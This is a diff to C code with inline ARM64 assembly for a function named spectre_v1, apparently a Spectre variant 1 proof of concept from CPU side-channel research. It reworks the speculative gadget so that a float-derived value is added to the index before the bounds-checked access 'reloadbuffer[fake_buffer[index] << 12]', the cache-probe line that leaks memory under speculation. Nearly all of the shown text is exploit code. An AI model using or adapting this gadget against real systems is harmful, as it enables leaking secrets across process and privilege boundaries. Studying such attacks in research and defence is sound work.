@@ -65,7 +65,7 @@ static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
 //	size_t dummy = ***size_ptr3;
 	size_t branch;
 	size_t dummy = index;
-	double num = 3.1415926;
+	double num = 0;
 	double divi = 1.1234567;
 	asm volatile(
 		"ldr d0, %[num]\n\r"
@@ -105,24 +105,17 @@ static inline  __attribute__((always_inline)) void spectre_v1( size_t index) {
 	/*
 	 * Spectre v1 runahead
 	 */
-	if (dummy < size)
+	if (index < size)
 	{	
-		asm volatile(
-		"mov x0, %0\n\r"
-		".rept 100\n\r"
-		"nop\n\r"
-		".endr\n\r"
-//		"fadd d0, d0, d1\n\r"
-//		"fcvtzs x2, d0\n\r"
-//		"mul x2, x2, x10\n\r"
-//		"adds x0, x0, x2\n\r"
-		"ldr %0, [x0]\n\r "
-		: "=r" (branch)
-		: "r" (&dummy)
-		:"x0"
-	);
-//		MOV(100);
-		pick = reloadbuffer[fake_buffer[branch] << 12];
+		asm volatile (
+			"fcvtzs x2, d0\n\r"
+//			"mov x2, #0\n\r"
+  			"add %[index], %[index], x2\n\r" 
+    		: [index] "+r" (index)        
+    		:                            
+    		: "x2"                      
+		);
+		pick = reloadbuffer[fake_buffer[index] << 12];
 	}
 }
 
